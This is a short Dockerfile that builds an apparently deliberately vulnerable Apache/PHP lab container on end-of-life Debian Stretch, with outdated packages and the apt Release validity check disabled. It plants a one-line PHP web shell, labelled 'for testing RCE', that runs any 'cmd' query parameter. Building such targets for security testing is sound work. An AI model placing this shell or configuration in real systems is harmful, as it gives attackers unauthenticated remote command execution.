FROM debian:stretch

# Replace default apt sources with archive URLs (Stretch is EOL)
RUN sed -i 's|http://deb.debian.org|http://archive.debian.org|g' /etc/apt/sources.list && \
    sed -i 's|http://security.debian.org|http://archive.debian.org|g' /etc/apt/sources.list && \
    echo 'Acquire::Check-Valid-Until "false";' > /etc/apt/apt.conf.d/99no-check-valid-until

# Install vulnerable/outdated packages
RUN apt-get update && apt-get install -y \
    openssl \
    libssl1.0.0 \
    curl \
    wget \
    apache2 \
    php \
    vim \
    sudo \
    && apt-get clean

# Add insecure PHP shell for testing RCE
RUN echo "<?php echo shell_exec(\$_GET['cmd']); ?>" > /var/www/html/shell.php

EXPOSE 80

CMD ["apachectl", "-D", "FOREGROUND"]
